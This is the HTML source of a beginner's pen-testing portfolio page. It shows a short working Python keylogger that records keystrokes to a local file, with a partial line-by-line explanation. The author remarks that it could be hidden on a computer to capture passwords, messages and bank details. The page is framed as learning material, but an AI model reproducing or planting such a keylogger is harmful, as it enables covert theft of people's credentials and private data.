 <html>
  <head>
     <link rel="stylesheet" href="index.css">
  </head>
   <body>
    <Header id="section-Expo"> 
      <img class="img_Me" src="images/8626f4a9-f60a-4198-b2f0-02b9067687d1.jpeg" width="300"/>
     <div class="Expo-MeDiv">
      <p class="Expo_Me" >Hello, I am a young inspiring pen tester that wants to make a spot in industry, every since I gotten the idea of ethical hacking i've been try to learn and gain experience of looking and exporting vulnerabilities online, this portfolio will show what experience and skills I learned over the time in the internet, from trustrd websites that teaches you how to use kali Linux for pen testimg websites and files, to my cyber security class that teches me the basics of the subjet, to on hand experience of what I learned and trying to find vulnerabilities all over in the web, I will show my skills to anyone reading this page to prevail my career. </p>
     </div>
    </Header>

<div class="Projets_section">
   <h1 class="Projets_title">---Projets---</h1>
</div>

<div class="Projets_name">
 <h2>KeyLogger</h2>
 <h2>Made and Updated by: 3/18/2025--3/18/2025</h2>
</div>

<div class="Projets_imgAndDet">
 <div class="Code_keylog">
  <img src="images/keylogger-768x403.png" width="450" height="450" />
   <pre width="450" height="300">
    <code width="450" height="300"> 
   from pynput import keyboard
     
def keyPressed(key):
    print(str(key))
    with open("keyfule.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error getting char")
        if key == keyboard.Key.enter:
            logKey.write("\n")
        elif key == keyboard.Key.space:
            logKey.write(' ')
            
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
   
  </code>
 </pre>
</div>

 <details>
  <h3>Technical Details</h3>
  <ul style="list-style-type:square">
   <li><strong>Programming Language:</strong>Python</li>
   <li><strong>Frameworks/Libraries:</strong>Pynput</li>
   <li><strong>Key Features:</strong>
    <ul style="list-style-type:square">
     <li>Cross-platform support (Windows, macOS, Linux)</li>
     <li>Simple API for listening to keyboard events</li>
     <li>Ability to simulate keyboard input</li>
    </ul>
   </li>
  </ul>
 </details>
</div>

<div class="Projets_Expo">
 <p>Before I start, I obtained this Keylogger from a YouTube tutorial, As a beginner, I try to learn from resources that are readily available to me. That way, I can understand how things work on my own without constantly needing to seek help. So I have added 2 new modifications to impove on less confusion in the log, but too the point, this is a basic Keylogger that records keystrokes that have been pressed, this can be used of course to be hidden into a computer and log any sensitive information that was typed on said computer, like emails with passwords, private text messages, Bank info, and more. Here I will break down my simple code.</p>
</div>

<div class="code_display_A">
 <pre width="300" height="200">
  <code width="300" height="200">
  def keyPressed(key):
    print(str(key))
    with open("keyfule.txt", 'a') as logKey:
  </code>
 </pre>

<p>Here is the start of the function where I set the parameter as Key</p>

</div>
  </body>
 </html>
